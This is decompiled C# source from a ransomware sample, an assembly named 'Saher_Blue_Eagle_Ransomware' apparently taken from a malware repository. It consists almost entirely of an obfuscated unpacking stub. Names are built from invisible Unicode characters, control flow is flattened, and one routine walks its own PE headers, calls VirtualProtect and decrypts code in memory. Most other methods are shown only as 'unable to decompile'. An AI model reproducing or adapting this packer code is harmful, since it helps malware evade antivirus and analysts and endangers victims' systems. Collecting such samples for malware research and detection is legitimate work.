// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: Saher_Blue_Eagle_Ransomware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7EC118C6-B23A-475E-8626-1B064D924B7D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-a2043ce3176f7789fe5990b614a2cca4578a28fc789e0ce31fec93da9398691b.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

internal class \u003CModule\u003E
{
  internal static byte[] \u206F‎‮‮⁬‭⁮‏⁫‬‌⁮⁪⁭⁮‌‮⁪‭⁯‭⁮‬⁯⁫​⁫‏‏​​‌⁮⁮‫⁪‪‪⁫⁮‮;
  internal static \u003CModule\u003E.\u206D‪⁭‬‭‌​⁮⁫⁭‬‌⁪⁭⁯⁪‪‎‍‬‭‎‏‫⁯‫‏​‭‎‍‎‬‭‌⁪⁭‭⁪‭‮ \u206B‮‬‍​⁯‭‍⁫⁮‏⁭‎⁪⁮⁫⁫⁪⁮‍⁯‌‬‮‬⁯‪⁮‎‬‎‪⁭‫‍‭⁭‏‭⁮‮;
  internal static Assembly \u202C‌​‮⁯‌‭⁯​⁭‭‭‮‭⁫‍‌⁮‎‌‎‭⁭​‭⁬‌⁭​‍‮⁫‎⁪‭‌‌‎‭‎‮;
  internal static \u003CModule\u003E.\u206A‌‏‪‮‏‮​​‎‍‌‍‫‌‌⁮⁫‏⁮‫​‬‎⁬‬⁫⁯‬⁫⁮‎‎‪⁯‪⁭‪‬‪‮ \u202E‬‫⁫‌‫‍‬⁬⁯⁮⁬⁯‏‏‫⁯⁪⁭‍‌⁭‎‪⁬⁮‬⁬​⁬‌‪⁬‎⁬‭⁮⁭‭‏‮;

  static \u003CModule\u003E()
  {
    \u003CModule\u003E.\u200D‪​‬‫⁯‎⁫​⁪​‭‪‏⁪⁪‫⁬‏‏‎‮‬‎⁭‏‪‮⁫⁯‍‮⁫‪⁮‏⁪‪⁪‌‮();
    \u003CModule\u003E.\u200F‏​‪⁬‫⁯​‮⁬‍⁫‎⁯‏‍⁮‎‮⁭‏⁭‬⁭‪⁬‭⁭⁫‮‎⁮‫⁯⁭⁯⁬‬‭‎‮();
    \u003CModule\u003E.\u200D‮⁯‌‫‍‍‬⁬​‌​‏‏‪‫‎‭‏⁪‮‎‮‬‍⁯‍‏⁭‍⁬⁫‮‫‍⁫‍⁫⁯⁭‮();
label_1:
    int num1 = -2124848908;
    while (true)
    {
      uint num2;
      switch ((num2 = (uint) (num1 ^ -822436373)) % 3U)
      {
        case 0:
          goto label_1;
        case 1:
          \u003CModule\u003E.\u202D⁭‪‎‫‍‍‭‏‌⁮⁬‎⁯‍‮⁫‌​‫‎⁪⁯‪‌‌⁭‌‪⁪‎‬‬⁬‭⁬⁪⁮‎⁯‮();
          num1 = (int) num2 * 824031750 ^ 1303414195;
          continue;
        default:
          goto label_4;
      }
    }
label_4:
    \u003CModule\u003E.\u202D‎‎⁯‮⁭⁪‏⁭⁮‫‍‏⁯‌‮⁯​‌⁫‌⁯⁪⁪‪⁮‍‏⁪⁯‪‫‬⁬⁮‮‌‭⁫‭‮();
  }

  private static void \u202D‎‎⁯‮⁭⁪‏⁭⁮‫‍‏⁯‌‮⁯​‌⁫‌⁯⁪⁪‪⁮‍‏⁪⁯‪‫‬⁬⁮‮‌‭⁫‭‮()
  {
    // ISSUE: unable to decompile the method.
  }

  private static void \u206C‭⁮‭‮‫‮‎‎‫‪‏​⁭⁯⁯⁬‏⁫⁮⁫‬‮‏⁮⁬‭⁯‪⁬⁪‮⁭⁭‏‏‌‭‏⁫‮([In] object obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern unsafe bool \u206B⁬‌‎⁭‍​‭‎⁭‬⁯⁭⁯⁬‮⁪‌⁪‫‭‏⁪⁬⁮‪‍‍​‭‭⁭‎‫‫‌⁬‮⁭⁮‮(
    [In] byte* obj0,
    [In] int obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static void \u202D⁭‪‎‫‍‍‭‏‌⁮⁬‎⁯‍‮⁫‌​‫‎⁪⁯‪‌‌⁭‌‪⁪‎‬‬⁬‭⁬⁪⁮‎⁯‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static Type \u200F‪⁮⁫‍‌⁭⁪‮​⁮‮‎‮‪​⁪‭‏‏‌‮‪‍‏‏‫‌‎⁫‮‎⁫‮⁪⁭‪⁪​‌‮([In] RuntimeTypeHandle obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Type \u200C⁯‫⁯⁭‪⁫‬‬⁯‭⁪‌‏⁬‪‏‏⁮‎‍‪‭‬‬‏⁮‫‬‏‏‭⁯‍‌‬⁪‮‪‭‮([In] RuntimeTypeHandle obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static MethodInfo \u206B‬⁫‫‪‫‏‬‌‭​‍⁮⁭‫‭‭‌‭⁫⁫​⁫‏‏‫‎​​‫‍⁪‬⁬‭‏⁯‫⁮⁮‮(
    [In] Type obj0,
    [In] string obj1,
    [In] Type[] obj2)
  {
    // ISSUE: unable to decompile the method.
  }

  static string \u202E‪‎‫‍⁮‭‫‏‌‏‫‍‬‪⁭⁭‍‬​⁫‮⁪‌⁮​⁭‬‫⁪⁯⁮‌⁭⁮‬⁬‫‪‮([In] string obj0, [In] string obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static object \u206A‪‪‍‮‎‪‭‮‏⁪‮‪‍‮‬‎⁭⁯‍⁫‮‎‬⁮⁪⁪‌‌​‌‎⁫‍‎⁮⁬⁫⁪‌‮(
    [In] MethodBase obj0,
    [In] object obj1,
    [In] object[] obj2)
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u206B​‪‍​‌⁯‭‎‬‍‮⁫‬‎⁭​‮⁯‫⁯‮‍⁮⁪‭⁫⁫‫‍‬⁮⁮⁪⁬‍​‭⁮‫‮([In] object obj0, [In] object obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u200D‪‍⁯⁬‌​‪⁯‭⁬​‏‮‬​‫⁭‬⁪⁯‎‏‍‏⁮‎⁫⁭‏‫⁭‪⁮‌⁯‪‍‪‍‮([In] string obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Thread \u200E‪‬‌‍⁯‭‭‮‎‪‮⁬‏‮⁮‎⁭⁯‎‪⁭‌‌‎‏‌⁪‍‍‏‍‎‎⁮‌‭‎‮‭‮([In] ParameterizedThreadStart obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202B‫⁭‭⁮‬‫⁬‎⁯‌‫‮‮‍‬‏‭⁪‌⁪⁪‬‎⁮‮⁯⁪‏⁫⁯⁯‬‏‪⁬‏​⁯⁭‮([In] Thread obj0, [In] bool obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u200C‌⁯‍‍‫⁬⁫‪⁬⁬‫⁮⁪‍⁫‬‌‬⁬‌‫‎‌‍⁮‏​⁭‬⁬⁮⁮‬‮‏‎‪‍‏‮([In] Thread obj0, [In] object obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static Thread \u206F⁮‍‭‍​‍⁭‪‏​‎⁫​‫⁭‫‎‬⁯⁪‍‌⁮‏‍​‬‮‌⁪‮‏‍‪⁫⁪‫‬⁮‮([In] ParameterizedThreadStart obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206B​⁯⁫‍‍⁯⁯​‫​‌⁯⁭‭‌‭‮⁭‭‏‭‬⁭⁮‫‭‭⁫‎‍⁬‬⁫​⁭‏⁪‪‏‮([In] Thread obj0, [In] bool obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static Thread \u206B‫⁬‮‏‍‏‮​‬⁬‫‏⁮‫‪‍⁭‭‪⁭⁫‎‏‏⁮​⁭⁮​‫‪‏‪‪​⁫⁯⁮‌‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202B‌‪⁮⁯‫‍‪​‏‎⁯‏‎‮⁮‮⁭⁮⁪⁪‌‭‪‍⁪‪⁫⁫⁬​⁬‌‎⁫⁮⁬‪‫⁪‮([In] Thread obj0, [In] object obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206C⁮‭⁫‌⁮‫‪⁪‌⁭‮⁯⁬‬⁯‮⁭‭‍‏⁮‌‭⁪⁬‭⁬‪‎‏‏‍‏‎⁫‭⁯‍‍‮([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u202A⁬‍‏⁭‫⁪​‏⁮⁮⁫‫⁫⁪‪⁫⁫⁯‮⁪⁭‏⁪⁪‮​‬‪‮⁯‭‌‎‪‏‮‫‮‮‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u206A‫‪‎⁪‬‮⁪‮‎⁪⁯⁮⁭⁬‫⁬⁫‭⁪‎⁪‬‭‮⁬‪⁭⁪‭⁬‍​⁯‭⁭‮‫⁫⁫‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202E‍‮‬⁭⁯‍‍‪⁯‮‪‬‬‍‬‪‍​⁯⁯⁭‎‪⁮⁪⁪‏⁪‎⁫⁯‭‫​‭‎⁮⁯‮‮([In] string obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static bool \u200E‬⁬‏‏‏‮‫‮‮‍​⁯‬‎⁫⁪⁬‭⁮‍‍⁯‎‎‬⁯‬‏​‬⁫‬‎‍‌⁬⁮‍‭‮([In] Thread obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202E‫​⁭‎⁯‮‏‭​‍⁫⁫‍⁭⁯‎‍⁬‎‪‮⁬‬‬‌‎‮‭‍‍‪‪⁫‏‮⁬⁬‭⁮‮([In] string obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206A​‮‍⁬‫‪⁮‍‫‍‌⁬‬‎⁪⁬‌⁬‌⁬⁯⁫‌‬​⁬⁬‫⁭‍​⁭​​⁯‬‬​‫‮([In] int obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Type \u206E‮⁬⁪⁬‭⁫‍‌‫‮⁭‎​‫⁪⁫⁯‪‪‍‬⁮‍‌‬‬‫‮‎‬‍⁮‪‏‪‌⁯‏‬‮([In] RuntimeTypeHandle obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static Module \u202C‎‍‫‌‭⁮⁮‏‭‪‍‫‌‫‬⁯⁮‍‪‭‬‍​‍‬‭‭‪‬⁬‬‌⁪‏⁮‪‏⁯‬‮([In] Type obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static IntPtr \u202E‭‏⁫⁭⁫‭‌⁪‏⁯‎‪‬⁯‎⁭‎​⁯‬‬‬‪‪⁮‫​‫⁭‍⁭‎‏​‭⁪‌⁪‮([In] Module obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static string \u202A‬⁬‭‌⁪‫‭‎‍‫‭‫‏‪‎‌‮⁮⁪⁯​⁮⁫​⁪⁯‫‮‎‏‪⁭‎⁫⁭‎‮‫‌‮([In] Module obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  static char \u200C⁪⁯‪‎⁯⁫‎​‎⁯⁯‫‮‪⁯‎‫⁫‏‎⁯‍⁭⁬⁪‮⁬⁯‪‬⁪‎‮⁯⁫⁮‭‏⁯‮([In] string obj0, [In] int obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u202A⁮‭⁯‎⁭⁮‬⁮⁫⁪‍‬‭‮⁯⁬⁮‌⁬‪‍⁭⁭‫⁭‎⁬‏‏​‎‏​⁪‭⁯‫‫‎‮(
    [In] byte[] obj0,
    [In] int obj1,
    [In] IntPtr obj2,
    [In] int obj3)
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206B‫‍‮⁮‫⁮⁪⁮⁪⁫‏​‪‌‍⁯⁭⁫⁯⁬‫⁭‪‌⁮‮‮‭⁬​⁮​‫‪⁭​⁬‏‌‮(
    [In] byte[] obj0,
    [In] int obj1,
    [In] IntPtr obj2,
    [In] int obj3)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static byte[] \u206F‬‎⁮‮⁫​⁭⁯⁯⁫⁮‮‮‌‫‪‌⁭⁯‌‌‍⁫‬‍​‭⁫‎‍‌⁫‬⁭‪‍‬‌‏‮([In] byte[] obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static void \u200D‮⁯‌‫‍‍‬⁬​‌​‏‏‪‫‎‭‏⁪‮‎‮‬‍⁯‍‏⁭‍⁬⁫‮‫‍⁫‍⁫⁯⁭‮()
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u200B​⁯‪​⁭‎‪‭‌‌⁮‬⁬‫‫⁪⁫‌⁮‬‎‮‬⁯⁭‬⁭‬⁮⁫‍‌⁫‎‮‬‪‪‍‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u200F‌‏‎‪⁭‎⁭⁭‎⁫⁭⁪​‌‫‌‎⁬‬⁮⁬‎⁬‮⁭‫⁭‏⁫​⁪‌​‭‌⁫⁭⁭‍‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206A⁮‪⁪‎‮⁬‭‪⁬‭‎‫‬‮​​⁭‮⁯⁬‏‪⁭⁯⁭⁫‫‭⁮‍‏‭‫​‌⁭‭‪⁮‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206B⁮⁫⁮⁫‪‭⁬‭‮‮⁯‫‫‭‎‫‭⁫⁮⁪‬​⁮‪⁪‏‭⁫⁪‍​⁪​⁫⁭⁬‬‪‬‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static \u002D \u206F‌‮⁫‪⁫‪‌‌‭‎⁭‬‬⁫‪⁭‎‎‬‭‭‬⁭‏⁮⁫‬‫‫⁯‪‮‌‌⁫‌⁬‪⁮‮<\u002D>([In] uint obj0)
  {
    // ISSUE: unable to decompile the method.
  }

  internal static void \u200F‏​‪⁬‫⁯​‮⁬‍⁫‎⁯‏‍⁮‎‮⁭‏⁭‬⁭‪⁬‭⁭⁫‮‎⁮‫⁯⁭⁯⁬‬‭‎‮()
  {
    // ISSUE: unable to decompile the method.
  }

  internal static Assembly \u202A‬‬⁫‬⁬‌‍‏⁭‌‭⁫​⁪‬‫‬⁪​‌⁯‮​‍⁮⁭⁪⁫⁪‮⁪‭⁯‭‭‮‭⁯‭‮(
    [In] object obj0,
    [In] ResolveEventArgs obj1)
  {
    // ISSUE: unable to decompile the method.
  }

  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect")]
  internal static extern bool \u206C‫⁯⁭​‏‪⁬⁬⁫‮‬⁪‮‏​⁭⁫‬‏‍⁮⁫‭‫‬‎‌‬⁭‏‪‍‍‍⁯‭⁮⁫‍‮(
    [In] IntPtr obj0,
    [In] uint obj1,
    [In] uint obj2,
    [In] ref uint obj3);

  internal static unsafe void \u200D‪​‬‫⁯‎⁫​⁪​‭‪‏⁪⁪‫⁬‏‏‎‮‬‎⁭‏‪‮⁫⁯‍‮⁫‪⁮‏⁪‪⁪‌‮()
  {
    Module module = typeof (\u003CModule\u003E).Module;
label_1:
    int num1 = -1689930894;
    while (true)
    {
      uint num2;
      byte* numPtr1;
      ushort num3;
      uint* numPtr2;
      uint* numPtr3;
      uint num4;
      uint[] numArray1;
      uint[] numArray2;
      uint num5;
      uint num6;
      byte* hinstance;
      bool flag;
      uint* numPtr4;
      uint num7;
      uint num8;
      uint num9;
      int num10;
      ushort num11;
      int index;
      uint num12;
      string fullyQualifiedName;
      uint num13;
      uint num14;
      uint num15;
      uint num16;
      uint num17;
      int num18;
      int num19;
      switch ((num2 = (uint) (num1 ^ -484392665)) % 53U)
      {
        case 0:
          ++num14;
          num1 = (int) num2 * -1513973526 ^ -896249097;
          continue;
        case 1:
          int num20;
          num1 = num20 = num13 >= num17 ? -929328140 : (num20 = -2080041464);
          continue;
        case 2:
          fullyQualifiedName = module.FullyQualifiedName;
          if (fullyQualifiedName.Length <= 0)
          {
            num18 = 0;
            break;
          }
          num1 = (int) num2 * -182537168 ^ 1920949021;
          continue;
        case 3:
          numArray1[2] = numArray1[2] + numArray2[2];
          num1 = (int) num2 * 975483923 ^ 853803419;
          continue;
        case 4:
          numArray1 = new uint[16];
          numArray2 = new uint[16];
          index = 0;
          num1 = (int) num2 * -861375591 ^ -990139372;
          continue;
        case 5:
          numPtr1 = hinstance + (int) *(uint*) (hinstance + 60);
          num1 = (int) num2 * -294297316 ^ -2112176766;
          continue;
        case 6:
          hinstance = (byte*) (void*) Marshal.GetHINSTANCE(module);
          num1 = (int) num2 * 2137163527 ^ -614920480;
          continue;
        case 7:
          num17 = numPtr2[2] >> 2;
          num1 = (int) num2 * -991630647 ^ -174044580;
          continue;
        case 8:
          int num21;
          num1 = num21 = num10 < (int) num11 ? -246567668 : (num21 = -98437091);
          continue;
        case 9:
          numArray1[index] = num7;
          numArray2[index] = num8;
          num1 = -1907662692;
          continue;
        case 10:
          num9 = (uint) (((int) num15 ^ (int) *numPtr4++) + (int) num8 + (int) num16 * (int) num7);
          num15 = num8;
          num8 = num16;
          num1 = -715618288;
          continue;
        case 11:
          numPtr2 = (uint*) (numPtr1 + 24 + (int) num3);
          num1 = (int) num2 * 667382481 ^ -1757149384;
          continue;
        case 12:
          num10 = 0;
          num1 = (int) num2 * 1302553666 ^ -204239661;
          continue;
        case 13:
          num8 = 3224827352U;
          num1 = (int) num2 * 1657700270 ^ 1448605384;
          continue;
        case 14:
          num15 = 561076816U;
          num1 = (int) num2 * 1474988453 ^ -689444486;
          continue;
        case 15:
          num8 = num7;
          num7 = num9;
          num1 = (int) num2 * -1399639178 ^ -1157746664;
          continue;
        case 16:
          int num22;
          num1 = num22 = num14 < num4 ? -691265198 : (num22 = -957216238);
          continue;
        case 17:
          num3 = *(ushort*) (numPtr1 + 20);
          numPtr3 = (uint*) null;
          num4 = 0U;
          num1 = (int) num2 * 132642031 ^ 266461890;
          continue;
        case 18:
          numArray1[9] = numArray1[9] ^ numArray2[9];
          numArray1[10] = numArray1[10] * numArray2[10];
          num1 = (int) num2 * 352393569 ^ 572449337;
          continue;
        case 19:
          num12 = 0U;
          num1 = -831300677;
          continue;
        case 20:
          num19 = (int) *numPtr2;
          goto label_40;
        case 21:
          numPtr2 += 8;
          num1 = -939798559;
          continue;
        case 22:
          int num23;
          num1 = num23 = index < 16 ? -1702673520 : (num23 = -431418468);
          continue;
        case 23:
          if (!flag)
          {
            num1 = (int) num2 * 1393121557 ^ -1414884858;
            continue;
          }
          num19 = (int) numPtr2[2];
          goto label_40;
        case 24:
          num15 = num8 >> 5 | num8 << 27;
          num8 = num16 >> 3 | num16 << 29;
          num16 = num7 >> 7 | num7 << 25;
          num1 = (int) num2 * -843079497 ^ 1601697477;
          continue;
        case 25:
          uint* numPtr5 = numPtr2;
          uint* numPtr6 = (uint*) ((IntPtr) numPtr5 + new IntPtr(4));
          int num24 = (int) *numPtr5;
          uint* numPtr7 = numPtr6;
          numPtr2 = (uint*) ((IntPtr) numPtr7 + new IntPtr(4));
          int num25 = (int) *numPtr7;
          num5 = (uint) (num24 * num25);
          int num26;
          num1 = num26 = num5 == 1508579604U ? -1159492337 : (num26 = -1798000868);
          continue;
        case 26:
          num16 = 1836020015U;
          num7 = 3781835077U;
          num1 = (int) num2 * 25053522 ^ -891473736;
          continue;
        case 27:
          num13 = 0U;
          num1 = (int) num2 * 1071135243 ^ 9114141;
          continue;
        case 28:
          int num27;
          num1 = num27 = num5 == 0U ? -929328140 : (num27 = -1352972093);
          continue;
        case 29:
          goto label_45;
        case 30:
          numArray1[0] = numArray1[0] ^ numArray2[0];
          numArray1[1] = numArray1[1] * numArray2[1];
          num1 = (int) num2 * -805416255 ^ -1851989785;
          continue;
        case 31:
          num7 = num15 >> 11 | num15 << 21;
          ++index;
          num1 = (int) num2 * 1321250934 ^ 285333871;
          continue;
        case 32:
          num18 = fullyQualifiedName[0] == '<' ? 1 : 0;
          break;
        case 33:
          num6 = 64U;
          \u003CModule\u003E.\u206C‫⁯⁭​‏‪⁬⁬⁫‮‬⁪‮‏​⁭⁫‬‏‍⁮⁫‭‫‬‎‌‬⁭‏‪‍‍‍⁯‭⁮⁫‍‮((IntPtr) (void*) numPtr3, num4 << 2, num6, ref num6);
          num1 = (int) num2 * 1491357661 ^ -1239732776;
          continue;
        case 34:
          numArray1[8] = numArray1[8] + numArray2[8];
          num1 = (int) num2 * -1626057079 ^ 1647616146;
          continue;
        case 35:
          numPtr4 = (uint*) (hinstance + (flag ? (int) numPtr2[3] : (int) numPtr2[1]));
          num1 = -20738441;
          continue;
        case 36:
          num14 = 0U;
          num1 = (int) num2 * 946987692 ^ 88722228;
          continue;
        case 37:
          numPtr3 = (uint*) (hinstance + (flag ? (int) numPtr2[3] : (int) numPtr2[1]));
          num1 = -148373182;
          continue;
        case 38:
          num11 = *(ushort*) (numPtr1 + 6);
          num1 = (int) num2 * -660317807 ^ 1167594650;
          continue;
        case 39:
          numArray1[4] = numArray1[4] * numArray2[4];
          numArray1[5] = numArray1[5] + numArray2[5];
          num1 = (int) num2 * 1503301902 ^ 1695390311;
          continue;
        case 40:
          numArray1[13] = numArray1[13] * numArray2[13];
          numArray1[14] = numArray1[14] + numArray2[14];
          numArray1[15] = numArray1[15] ^ numArray2[15];
          num1 = (int) num2 * 960381421 ^ 602792539;
          continue;
        case 41:
          num1 = (int) num2 * 687555979 ^ -1517311210;
          continue;
        case 42:
          goto label_3;
        case 43:
          numArray1[11] = numArray1[11] + numArray2[11];
          num1 = (int) num2 * -725134178 ^ -590808377;
          continue;
        case 44:
          numArray1[3] = numArray1[3] ^ numArray2[3];
          num1 = (int) num2 * 332740105 ^ -269103052;
          continue;
        case 45:
          uint* numPtr8 = numPtr3;
          int num28 = (int) *numPtr8 ^ (int) numArray1[(IntPtr) (num12 & 15U)];
          *numPtr8 = (uint) num28;
          numArray1[(IntPtr) (num12 & 15U)] = (uint) (((int) numArray1[(IntPtr) (num12 & 15U)] ^ (int) *numPtr3++) + 1035675673);
          ++num12;
          num1 = -1252504470;
          continue;
        case 46:
          numArray1[12] = numArray1[12] ^ numArray2[12];
          num1 = (int) num2 * 1296781653 ^ -2058858914;
          continue;
        case 47:
          ++num10;
          num1 = (int) num2 * 89138314 ^ -330311707;
          continue;
        case 48:
          goto label_1;
        case 49:
          int num29 = num6 != 64U ? -1133929685 : (num29 = -913443313);
          num1 = num29 ^ (int) num2 * 1259410354;
          continue;
        case 50:
          numArray1[6] = numArray1[6] ^ numArray2[6];
          numArray1[7] = numArray1[7] * numArray2[7];
          num1 = (int) num2 * 948436593 ^ -573701553;
          continue;
        case 51:
          ++num13;
          num1 = (int) num2 * -656273715 ^ 96533157;
          continue;
        case 52:
          num1 = (int) num2 * 1175888185 ^ 593486590;
          continue;
        default:
          goto label_61;
      }
      flag = num18 != 0;
      num1 = -732046977;
      continue;
label_40:
      num4 = (uint) num19 >> 2;
      num1 = -929328140;
    }
label_45:
    return;
label_3:
    return;
label_61:;
  }

  internal struct \u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮
  {
    internal uint \u200C⁮⁬⁭⁮‏⁬⁫‏⁪‫‭‎⁪‏‎‪‏‬⁭⁮‮⁯‎⁬⁬⁫⁭‬‫‏⁬⁬‌⁫⁭‌‫‍‫‮;

    internal void \u206C⁪‏⁫⁭​‮‪⁪⁬‬⁫⁬‪‫⁮⁯‮⁫​‎‍⁭⁪‍‌‭‎‏‏​⁫⁮‌‬⁭‭⁬‌‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u202B​⁯​⁮⁬‮‮⁬​‫⁫‍⁪⁭⁪​‍‎‬⁭⁫⁪⁭‍‎⁯‍‮‫‮‌‭⁮‌⁫‍⁭​⁪‮(
      [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal struct \u202C⁪‮‏⁫⁬⁮‫⁭⁬⁪⁮⁮‮⁬‌‭‎‎‫⁫‬⁪⁭‪⁯⁫⁭‫​⁭‬‭‌‍⁭⁭‬‍⁪‮
  {
    internal readonly \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] \u202D⁬⁯⁯⁭​⁯‬⁭‎‌⁬⁮⁬⁭‌⁬‍‫⁬⁮⁫⁭‮‏‮⁭‎⁯‭⁬‮‬⁭⁮‏⁭‍⁪⁯‮;
    internal readonly int \u206D‭⁮‍⁭‬⁭‫‪⁪‍⁮⁫‪‭​⁪⁪‎⁭⁮‏‮‎‮⁬⁬⁬⁭​‎‫​⁭⁬‌​‍⁮⁮‮;

    internal \u202C⁪‮‏⁫⁬⁮‫⁭⁬⁪⁮⁮‮⁬‌‭‎‎‫⁫‬⁪⁭‪⁯⁫⁭‫​⁭‬‭‌‍⁭⁭‬‍⁪‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202D⁭⁬⁬‭⁯⁮‎‫‮⁫‏‬‏​​​‍‭‫‌‌⁬​‫‌‮‭‏‎‪⁬⁬‪⁪‭‫‭‍‏‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u202C⁭‫​‎‪‭⁫⁯⁬‬‭⁪⁬‭⁪⁪⁫⁭⁯‌⁪⁪⁫‬⁬‍‬‌‪‮‪‮‍⁬⁬‌​⁪‫‮(
      [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u200C⁫‭⁯‭⁭‫‭‍⁯‏⁫‏⁬‌‬⁭⁯‪⁯‪‌‬⁮⁯⁬⁯‍‌‍⁭‫⁫‪⁯⁫‭‬​‌‮(
      [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static uint \u206A‮‎‍‌⁬⁭⁮‬‍​‬​​⁭⁬‍⁯‭⁫⁯‍‏‍‮‍⁮‍‌⁫⁯‬‬‍‫‪⁪⁮‬‫‮(
      [In] \u003CModule\u003E.\u206E‭‭‌‌​‏‌‪‫​⁬‌‌‏‮⁬‫⁯‫‬‫‪‏‪⁫‪⁯​‏‮‌‪​⁬‏‬⁮​⁬‮[] obj0,
      [In] uint obj1,
      [In] \u003CModule\u003E.\u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮ obj2,
      [In] int obj3)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  internal class \u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮
  {
    internal uint \u202C‮‬⁬‭‌‪​⁮‫⁭‌⁭⁫⁮‫​⁬‬⁮​⁭‮‎‫⁭‮‏‫‮‪⁫‌‏​‫⁬‭‬‌‮;
    internal uint \u206A‫⁮‫‭‫⁭‎‌⁬⁯‬⁬‫⁫‭‫‎‍⁯⁮‮‍‎⁫⁭‎‎⁪‌‬⁫‮‭‬‪⁬‬‮‏‮;
    internal Stream \u202E⁭‭‏‍⁯‭⁭‎⁭‫⁯‮⁭⁫⁫‫​‏⁪‪​⁯‬‌‏‎⁪⁪⁬⁫‍⁭⁯⁯‬⁮‫⁯‪‮;

    internal void \u200B‮‏​⁮‌‌‌‎‫⁪⁯⁫‪⁬‍‏⁯⁫‪⁫⁬‍⁪⁭⁭‪⁮‌⁫‍⁬‬‭‮‬‪‎⁬‭‮([In] Stream obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u202A⁮‫⁬​⁪‪‎‌‬‏‪‏‭‭⁬‭⁪⁬‎⁯⁯⁪‭‌‍‬⁬‭‏‬‍‍‮⁬‮‎⁭⁮⁭‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal void \u206F⁬‎​‏⁬‏‏‍⁪‌‫‬⁭​⁪‍‍⁭‬‎‪‌‬⁬⁭⁭⁫⁬‭‭⁭⁪​‍⁭⁯⁯⁯‏‮()
    {
      // ISSUE: unable to decompile the method.
    }

    internal uint \u200B⁬‭​‪​‫‪⁫‍⁪⁯⁭⁫‏‬⁬‎⁪‬‫‌⁮⁬⁯​⁯‮⁬‬‌‭‏⁬‪⁮‬‪‭‬‮([In] int obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    internal \u206C‮‭‍⁯⁭⁭‍‏⁫‭⁫⁯‏‮⁬‬‍‫​⁭⁪⁭⁪⁭‭‎‮‍‌‮‫⁫⁭⁮‍​⁬‏‭‮()
    {
      // ISSUE: unable to decompile the method.
    }
  }

